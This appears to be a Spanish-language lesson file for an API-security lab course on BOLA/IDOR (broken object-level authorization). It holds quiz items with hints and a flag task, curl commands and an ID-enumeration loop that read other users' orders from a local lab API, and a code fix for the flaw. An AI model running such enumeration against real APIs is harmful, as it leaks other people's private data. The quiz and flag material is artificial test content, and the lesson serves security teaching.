@@ -1,0 +1,64 @@
+---
+index: 1
+title: "BOLA: objetos de otros usuarios"
+questions:
+  - id: api-security-t01-q01
+    prompt: "¿Qué número del OWASP API Top 10 ocupa BOLA (Broken Object Level Authorization)?"
+    hint: "API1"
+    kind: text
+  - id: api-security-t01-q02
+    prompt: "Eres alice (id=2). Recupera el pedido 1002, que pertenece a otro usuario. Envía la flag."
+    hint: "curl http://127.0.0.1:18101/api/orders/1002 — la API no comprueba la propiedad del objeto"
+    kind: flag
+  - id: api-security-t01-q03
+    prompt: "¿Qué campo debería comparar el servidor en /api/orders/{id} para cerrar el agujero?"
+    hint: "El pedido tiene user_id y tú tienes id en /api/me — hay que compararlos"
+    kind: text
+---
+
+## El bug de autorización más común de las APIs
+
+La autenticación responde "¿quién eres?" (token válido → alice, id=2).
+La **autorización** responde "¿puedes tocar ESTO?" — y es la que falla.
+
+```bash
+# ¿Quién soy?
+curl -s http://127.0.0.1:18101/api/me
+# {"id": 2, "name": "alice", "role": "user"}
+
+# ¿Qué pedidos existen? Enumera IDs:
+curl -s http://127.0.0.1:18101/api/users
+
+# El pedido de OTRO usuario (user_id: 1 = admin):
+curl -s http://127.0.0.1:18101/api/orders/1002
+# {"id": 1002, "user_id": 1, "amount": 999.99, ...,
+#  "note": "BOLA: this order belongs to user 1 but you are user 2"}
+```
+
+El servidor busca el pedido por ID y lo devuelve. Jamás compara
+`order.user_id` con el `id` del token. Cambia `1002` por `1001` o `1003`
+y recorres todos los pedidos de la tienda: direcciones, importes,
+artículos. En APIs reales (bancos, salud, gobierno) este único bug
+filtra millones de registros con un bucle `for` sobre IDs consecutivos.
+
+## Explotación con script (como un atacante real)
+
+```bash
+for id in 1001 1002 1003; do
+  curl -s "http://127.0.0.1:18101/api/orders/$id" | grep -E 'id|item'
+done
+```
+
+El IDOR clásico de apps web es exactamente esto con otro nombre:
+BOLA es la versión API del IDOR.
+
+## El fix
+
+```python
+order = orders.get(oid)
+if order['user_id'] != current_user['id']:   # ← la línea que falta
+    return error(404)  # 404 y no 403: no revelar que existe
+```
+
+Mejor aún: consultas que ya filtran por dueño
+(`WHERE id = ? AND user_id = ?`) en vez de buscar y comprobar después.
